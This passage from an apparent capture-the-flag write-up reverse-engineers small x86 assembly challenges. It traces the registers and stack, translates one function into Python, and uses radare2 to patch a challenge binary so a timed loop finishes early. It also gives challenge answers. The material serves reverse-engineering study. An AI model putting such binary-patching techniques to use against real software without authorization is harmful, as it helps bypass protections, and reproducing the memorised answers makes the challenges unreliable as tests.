</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm"><span style="color:#50fa7b">.intel_syntax</span> <span style="color:#8be9fd;font-style:italic">noprefix</span>
<span style="color:#50fa7b">.bits</span> <span style="color:#bd93f9">32</span>

<span style="color:#50fa7b">.global</span> <span style="color:#8be9fd;font-style:italic">asm2</span>					<span style="color:#6272a4">;asm2(0x8,0x21)</span>


<span style="color:#8be9fd;font-style:italic">asm2:</span>
	<span style="color:#50fa7b">push</span>   	<span style="color:#8be9fd;font-style:italic">ebp</span>				<span style="color:#6272a4">;arg1 = ebp+0x8 = 0x8	; arg2 = ebp+0xc = 0x21</span>
	<span style="color:#50fa7b">mov</span>    	<span style="color:#8be9fd;font-style:italic">ebp</span>,<span style="color:#8be9fd;font-style:italic">esp</span>
	<span style="color:#50fa7b">sub</span>    	<span style="color:#8be9fd;font-style:italic">esp</span>,<span style="color:#bd93f9">0x10</span>
	<span style="color:#50fa7b">mov</span>    	<span style="color:#8be9fd;font-style:italic">eax</span>,<span style="color:#8be9fd">DWORD</span> <span style="color:#8be9fd;font-style:italic">PTR</span> [<span style="color:#8be9fd;font-style:italic">arg2</span>]		<span style="color:#6272a4">;eax = 0x21</span>
	<span style="color:#50fa7b">mov</span> 	<span style="color:#8be9fd">DWORD</span> <span style="color:#8be9fd;font-style:italic">PTR</span> [<span style="color:#8be9fd;font-style:italic">increment</span>],<span style="color:#8be9fd;font-style:italic">eax</span>	<span style="color:#6272a4">;increment = 0x21</span>
	<span style="color:#50fa7b">mov</span>    	<span style="color:#8be9fd;font-style:italic">eax</span>,<span style="color:#8be9fd">DWORD</span> <span style="color:#8be9fd;font-style:italic">PTR</span> [<span style="color:#8be9fd;font-style:italic">arg1</span>]		<span style="color:#6272a4">;eax = arg1 = 0x8</span>
	<span style="color:#50fa7b">mov</span>	<span style="color:#8be9fd">DWORD</span> <span style="color:#8be9fd;font-style:italic">PTR</span> [<span style="color:#8be9fd;font-style:italic">ebp</span><span style="color:#ff79c6">-</span><span style="color:#bd93f9">0x8</span>],<span style="color:#8be9fd;font-style:italic">eax</span>		<span style="color:#6272a4">;ebp-0x8 = 0x8</span>
	<span style="color:#50fa7b">jmp</span>    	<span style="color:#8be9fd;font-style:italic">part_b</span>
<span style="color:#8be9fd;font-style:italic">part_a:</span>						<span style="color:#6272a4">;while (arg1 &lt;= 0x3923){</span>
	<span style="color:#50fa7b">add</span>    	<span style="color:#8be9fd">DWORD</span> <span style="color:#8be9fd;font-style:italic">PTR</span> [<span style="color:#8be9fd;font-style:italic">increment</span>],<span style="color:#bd93f9">0x1</span>	<span style="color:#6272a4">; 	increment++</span>
	<span style="color:#50fa7b">add</span>	<span style="color:#8be9fd">DWORD</span> <span style="color:#8be9fd;font-style:italic">PTR</span> [<span style="color:#8be9fd;font-style:italic">ebp</span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x8</span>],<span style="color:#bd93f9">0xa9</span>	<span style="color:#6272a4">; 	arg1 = arg1 + 0xa9</span>
<span style="color:#8be9fd;font-style:italic">part_b:</span>
	<span style="color:#50fa7b">cmp</span>    	<span style="color:#8be9fd">DWORD</span> <span style="color:#8be9fd;font-style:italic">PTR</span> [<span style="color:#8be9fd;font-style:italic">ebp</span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x8</span>],<span style="color:#bd93f9">0x3923</span>	<span style="color:#6272a4">;} /* while condition */</span>
	<span style="color:#50fa7b">jle</span>    	<span style="color:#8be9fd;font-style:italic">part_a</span>				<span style="color:#6272a4">;  /* while condition */</span>
	<span style="color:#50fa7b">mov</span>    	<span style="color:#8be9fd;font-style:italic">eax</span>,<span style="color:#8be9fd">DWORD</span> <span style="color:#8be9fd;font-style:italic">PTR</span> [<span style="color:#8be9fd;font-style:italic">increment</span>]	<span style="color:#6272a4">;</span>
	<span style="color:#50fa7b">mov</span>	<span style="color:#8be9fd;font-style:italic">esp</span>,<span style="color:#8be9fd;font-style:italic">ebp</span>
	<span style="color:#50fa7b">pop</span>	<span style="color:#8be9fd;font-style:italic">ebp</span>				<span style="color:#6272a4">;return increment</span>
	<span style="color:#50fa7b">ret</span>
</code></pre></td></tr></table>
</div>
</div><p>We can translate in python2</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">arg1 <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x8</span>
increment <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x21</span>
<span style="color:#ff79c6">while</span> (arg1 <span style="color:#ff79c6">&lt;=</span> <span style="color:#bd93f9">0x3923</span>) :
   increment <span style="color:#ff79c6">=</span> increment <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">1</span>
   arg1 <span style="color:#ff79c6">=</span> arg1 <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0xa9</span>

<span style="color:#8be9fd;font-style:italic">hex</span>(increment)
<span style="color:#f1fa8c">&#39;0x78&#39;</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="assembly-3">assembly-3</h2>
<p>We call the below assembly code with asm3(0xbda42100,0xb98dd6a5,0xecded223)</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm"><span style="color:#6272a4">;intel_syntax noprefix</span>
<span style="color:#6272a4">;bits 32</span>

<span style="color:#ff79c6">global</span> <span style="color:#8be9fd;font-style:italic">asm3</span>
<span style="color:#ff79c6">extern</span>  <span style="color:#8be9fd;font-style:italic">puts</span>
<span style="color:#ff79c6">section</span> <span style="color:#8be9fd;font-style:italic">.text</span>

<span style="color:#6272a4">;asm3(0xbda42100,0xb98dd6a5,0xecded223)</span>

<span style="color:#8be9fd;font-style:italic">asm3:</span>
	<span style="color:#50fa7b">push</span>   	<span style="color:#8be9fd;font-style:italic">ebp</span>
	<span style="color:#50fa7b">mov</span>    	<span style="color:#8be9fd;font-style:italic">ebp</span>,<span style="color:#8be9fd;font-style:italic">esp</span>
	<span style="color:#50fa7b">mov</span>	<span style="color:#8be9fd;font-style:italic">eax</span>,<span style="color:#bd93f9">0xbc</span>		<span style="color:#6272a4">;eax = ax = al = 0xbc = 188 ; ah = 0</span>
	<span style="color:#50fa7b">xor</span>	<span style="color:#8be9fd;font-style:italic">al</span>,<span style="color:#8be9fd;font-style:italic">al</span>			<span style="color:#6272a4">;clear all to zero</span>
	<span style="color:#50fa7b">mov</span>	<span style="color:#8be9fd;font-style:italic">ah</span>,<span style="color:#8be9fd">BYTE</span> <span style="color:#8be9fd;font-style:italic">PTR</span> [<span style="color:#8be9fd;font-style:italic">ebp</span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x9</span>]   <span style="color:#6272a4">;ah=0x21 (8-bit); ax = 0x2100 (16-bit)</span>
	<span style="color:#50fa7b">sal</span>	<span style="color:#8be9fd;font-style:italic">ax</span>,<span style="color:#bd93f9">0x10</span>			<span style="color:#6272a4">;ax = 0 ;ah=0x0 ; eax = 0x0 ; ax &lt;&lt; 16 = 0x0</span>
	<span style="color:#50fa7b">sub</span>	<span style="color:#8be9fd;font-style:italic">al</span>,<span style="color:#8be9fd">BYTE</span> <span style="color:#8be9fd;font-style:italic">PTR</span> [<span style="color:#8be9fd;font-style:italic">ebp</span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">0xc</span>]	<span style="color:#6272a4">;al= 0 - 0xa5 = (ff - a5) +1 = 5b ; ax = 5b</span>
	<span style="color:#50fa7b">add</span>	<span style="color:#8be9fd;font-style:italic">ah</span>,<span style="color:#8be9fd">BYTE</span> <span style="color:#8be9fd;font-style:italic">PTR</span> [<span style="color:#8be9fd;font-style:italic">ebp</span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">0xd</span>]	<span style="color:#6272a4">;ah = 0x0 + 0xd6 = 0xd6 ; ax = 0xd65b	# 8-bit addition</span>
	<span style="color:#50fa7b">xor</span>	<span style="color:#8be9fd;font-style:italic">ax</span>,<span style="color:#8be9fd">WORD</span> <span style="color:#8be9fd;font-style:italic">PTR</span> [<span style="color:#8be9fd;font-style:italic">ebp</span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x10</span>]	<span style="color:#6272a4">;ax = (0xd65b ^ 0xd223) = 0x478		#16-bit xor</span>
	<span style="color:#50fa7b">mov</span>	<span style="color:#8be9fd;font-style:italic">esp</span>, <span style="color:#8be9fd;font-style:italic">ebp</span>
	<span style="color:#50fa7b">pop</span>	<span style="color:#8be9fd;font-style:italic">ebp</span>
	<span style="color:#50fa7b">ret</span>
</code></pre></td></tr></table>
</div>
</div><p>Stack exploration:</p>
<pre tabindex="0"><code>;+---------------+
;| 0xecded223    | &lt;-- ebp + 0x10 (arg3)
;+---------------+
;| 0xb98dd6a5    | &lt;-- ebp + 0xc (arg2)
;+---------------+
;| 0xbda42100    | &lt;-- ebp + 0x8 (arg1)
;+---------------+
;| ret           | &lt;-- ebp + 0x4
;+---------------+
;| old ebp       | &lt;-- ebp
;+---------------+

;EAX is the full 32-bit value
;AX is the lower 16-bits
;AL is the lower 8 bits
;AH is the bits 8 through 15 (zero-based)
;------- EAX -------&gt;|      RAX    -----&gt;|
;|&lt;- AX --&gt;|
;|&lt;AL&gt;|&lt;AH&gt;|
;+----+----+----+----+----+----+----+----+
;| 01 | 23 | 45 | 67 | 89 | ab | cd | ef |
;+----+----+----+----+----+----+----+----+

;due to endianness (little-endian), stack looks like, relative to ebp:
;Byte grouping:
;+0x8 +0x9 +0xA +0xB +0xC +0xD +0xE +0xF +0x10 0x11 0x12 0x13
;+----+----+----+----+----+----+----+----+----+----+----+----+
;| 00 | 21 | a4 | bd | a5 | d6 | 8d | b9 | 23 | d2 | de | ec |
;+----+----+----+----+----+----+----+----+----+----+----+----+

;Word grouping:
;+0x8   +0xA   +0xC   +0xE   +0x10  +0x12
;+------+------+------+------+------+------+
;| 2100 | bda4 | d6a5 | b98d | d223 | ecde |
;+------+------+------+------+------+------+
</code></pre><p>Another way to do it is to compile and execute after few modifications below:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">15
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">16
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">17
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">18
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">19
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">20
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">21
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">22
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">23
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">24
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">25
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm"><span style="color:#6272a4">; Compile with: nasm -f elf assembly.asm</span>
<span style="color:#6272a4">; Link with (64 bit systems require elf_i386 option): ld -m elf_i386 assembly.o -o assembly</span>
<span style="color:#6272a4">; Run with: ./assembly &lt;arguments&gt;</span>

<span style="color:#6272a4">;asm3(0xbda42100,0xb98dd6a5,0xecded223)</span>

<span style="color:#ff79c6">SECTION</span> <span style="color:#8be9fd;font-style:italic">.data</span>

<span style="color:#ff79c6">SECTION</span> <span style="color:#8be9fd;font-style:italic">.text</span>
<span style="color:#ff79c6">global</span>  <span style="color:#8be9fd;font-style:italic">_start</span>

<span style="color:#8be9fd;font-style:italic">_start:</span>

	<span style="color:#50fa7b">push</span>   	<span style="color:#8be9fd;font-style:italic">ebp</span>
	<span style="color:#50fa7b">mov</span>    	<span style="color:#8be9fd;font-style:italic">ebp</span>,<span style="color:#8be9fd;font-style:italic">esp</span>
	<span style="color:#50fa7b">mov</span>	<span style="color:#8be9fd;font-style:italic">eax</span>,<span style="color:#bd93f9">0xbc</span>
	<span style="color:#50fa7b">xor</span>	<span style="color:#8be9fd;font-style:italic">al</span>,<span style="color:#8be9fd;font-style:italic">al</span>			<span style="color:#6272a4">;al = 0</span>
	<span style="color:#50fa7b">mov</span>	<span style="color:#8be9fd;font-style:italic">ah</span>,<span style="color:#8be9fd">BYTE</span> [<span style="color:#8be9fd;font-style:italic">ebp</span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x9</span>]	<span style="color:#6272a4">;</span>
	<span style="color:#50fa7b">sal</span>	<span style="color:#8be9fd;font-style:italic">ax</span>,<span style="color:#bd93f9">0x10</span>
	<span style="color:#50fa7b">sub</span>	<span style="color:#8be9fd;font-style:italic">al</span>,<span style="color:#8be9fd">BYTE</span> [<span style="color:#8be9fd;font-style:italic">ebp</span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">0xc</span>]
	<span style="color:#50fa7b">add</span>	<span style="color:#8be9fd;font-style:italic">ah</span>,<span style="color:#8be9fd">BYTE</span> [<span style="color:#8be9fd;font-style:italic">ebp</span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">0xd</span>]
	<span style="color:#50fa7b">xor</span>	<span style="color:#8be9fd;font-style:italic">ax</span>,<span style="color:#8be9fd">WORD</span> [<span style="color:#8be9fd;font-style:italic">ebp</span><span style="color:#ff79c6">+</span><span style="color:#bd93f9">0x10</span>]
	<span style="color:#50fa7b">mov</span>	<span style="color:#8be9fd;font-style:italic">esp</span>, <span style="color:#8be9fd;font-style:italic">ebp</span>
	<span style="color:#50fa7b">pop</span>	<span style="color:#8be9fd;font-style:italic">ebp</span>
	<span style="color:#50fa7b">ret</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="assembly-4">assembly-4</h2>
<ul>
<li><a href="./resources/assembly-4/comp.nasm">comp.nasm</a></li>
</ul>
<p>We have an assembly code file <a href="./resources/assembly-4/comp.nasm">comp.nasm</a> which is very long to reverse engineer; so instead we compile it:</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash"><span style="color:#ff79c6">#!/bin/sh
</span><span style="color:#ff79c6"></span>nasm -f elf comp.nasm
gcc -m32 -o comp comp.o
<span style="color:#8be9fd;font-style:italic">echo</span> <span style="color:#f1fa8c">`</span>./comp<span style="color:#f1fa8c">`</span>
</code></pre></td></tr></table>
</div>
</div><h2 id="be-quick-or-be-dead-1">be-quick-or-be-dead-1</h2>
<ul>
<li><a href="./resources/be-quick-or-be-dead-1/be-quick-or-be-dead-1">be-quick-or-be-dead-1</a></li>
</ul>
<p>sym.calculate_key contains a very long loop which cannot finish execution before the alarm_handler set by set_timer triggers an interruption to terminate the program.</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm">[0<span style="color:#50fa7b">x004005a0</span>]<span style="color:#ff79c6">&gt;</span> <span style="color:#8be9fd;font-style:italic">pdf</span> @ <span style="color:#8be9fd;font-style:italic">sym.calculate_key</span>
            <span style="color:#6272a4">; CALL XREF from sym.get_key @ 0x4007a9</span>
/ 29: <span style="color:#50fa7b">sym.calculate_key</span> ()<span style="color:#6272a4">;</span>
|           <span style="color:#6272a4">; var uint32_t var_4h @ rbp-0x4</span>
|           0<span style="color:#50fa7b">x00400706</span>      <span style="color:#bd93f9">55</span>             <span style="color:#8be9fd;font-style:italic">push</span> <span style="color:#8be9fd;font-style:italic">rbp</span>
|           0<span style="color:#50fa7b">x00400707</span>      <span style="color:#bd93f9">4889</span><span style="color:#8be9fd;font-style:italic">e5</span>         <span style="color:#8be9fd;font-style:italic">mov</span> <span style="color:#8be9fd;font-style:italic">rbp</span>, <span style="color:#8be9fd;font-style:italic">rsp</span>
|           0<span style="color:#50fa7b">x0040070a</span>      <span style="color:#8be9fd;font-style:italic">c745fc8b32c3.</span>  <span style="color:#8be9fd;font-style:italic">mov</span> <span style="color:#8be9fd">dword</span> [<span style="color:#8be9fd;font-style:italic">var_4h</span>], <span style="color:#bd93f9">0x75c3328b</span>
|           <span style="color:#6272a4">; CODE XREF from sym.calculate_key @ 0x40071c</span>
|       <span style="color:#50fa7b">.</span><span style="color:#ff79c6">-&gt;</span> <span style="color:#bd93f9">0x00400711</span>      <span style="color:#bd93f9">8345</span><span style="color:#8be9fd;font-style:italic">fc01</span>       <span style="color:#8be9fd;font-style:italic">add</span> <span style="color:#8be9fd">dword</span> [<span style="color:#8be9fd;font-style:italic">var_4h</span>], <span style="color:#bd93f9">1</span>
|       :   0<span style="color:#50fa7b">x00400715</span>      <span style="color:#bd93f9">817</span><span style="color:#8be9fd;font-style:italic">dfc166586.</span>  <span style="color:#8be9fd;font-style:italic">cmp</span> <span style="color:#8be9fd">dword</span> [<span style="color:#8be9fd;font-style:italic">var_4h</span>], <span style="color:#bd93f9">0xeb866516</span>
|       `=&lt; 0<span style="color:#50fa7b">x0040071c</span>      <span style="color:#bd93f9">75</span><span style="color:#8be9fd;font-style:italic">f3</span>           <span style="color:#8be9fd;font-style:italic">jne</span> <span style="color:#bd93f9">0x400711</span>
|           0<span style="color:#50fa7b">x0040071e</span>      <span style="color:#bd93f9">8</span><span style="color:#8be9fd;font-style:italic">b45fc</span>         <span style="color:#8be9fd;font-style:italic">mov</span> <span style="color:#8be9fd;font-style:italic">eax</span>, <span style="color:#8be9fd">dword</span> [<span style="color:#8be9fd;font-style:italic">var_4h</span>]
|           0<span style="color:#50fa7b">x00400721</span>      <span style="color:#bd93f9">5</span><span style="color:#8be9fd;font-style:italic">d</span>             <span style="color:#8be9fd;font-style:italic">pop</span> <span style="color:#8be9fd;font-style:italic">rbp</span>
\           0<span style="color:#50fa7b">x00400722</span>      <span style="color:#8be9fd;font-style:italic">c3</span>             <span style="color:#8be9fd;font-style:italic">ret</span>
</code></pre></td></tr></table>
</div>
</div><p>It is possible to patch sym.calculate_key with radare2 so that it finishes before the alarm is triggered</p>
<div class="highlight"><div style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4">
<table style="border-spacing:0;padding:0;margin:0;border:0;width:auto;overflow:auto;display:block;"><tr><td style="vertical-align:top;padding:0;margin:0;border:0;">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">1
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">2
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">3
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">4
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">5
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">6
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">7
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">8
</span><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">9
</span></code></pre></td>
<td style="vertical-align:top;padding:0;margin:0;border:0;;width:100%">
<pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-nasm" data-lang="nasm">[0<span style="color:#50fa7b">x004005a0</span>]<span style="color:#ff79c6">&gt;</span> <span style="color:#8be9fd;font-style:italic">s</span> <span style="color:#bd93f9">0x0040070a</span>
[0<span style="color:#50fa7b">x0040070a</span>]<span style="color:#ff79c6">&gt;</span> <span style="color:#8be9fd;font-style:italic">oo</span><span style="color:#ff79c6">+</span>
[0<span style="color:#50fa7b">x0040070a</span>]<span style="color:#ff79c6">&gt;</span> <span style="color:#f1fa8c">&#34;wa mov eax, 0xeb866516 ; pop rbp ; ret&#34;</span>
<span style="color:#50fa7b">Written</span> <span style="color:#bd93f9">7</span> <span style="color:#8be9fd">byte</span>(<span style="color:#8be9fd;font-style:italic">s</span>) (<span style="color:#8be9fd;font-style:italic">mov</span> <span style="color:#8be9fd;font-style:italic">eax</span>, <span style="color:#bd93f9">0xeb866516</span> <span style="color:#6272a4">; pop rbp ; ret) = wx b8166586eb5dc3</span>
[0<span style="color:#50fa7b">x0040070a</span>]<span style="color:#ff79c6">&gt;</span> <span style="color:#8be9fd;font-style:italic">pd</span> <span style="color:#bd93f9">3</span>
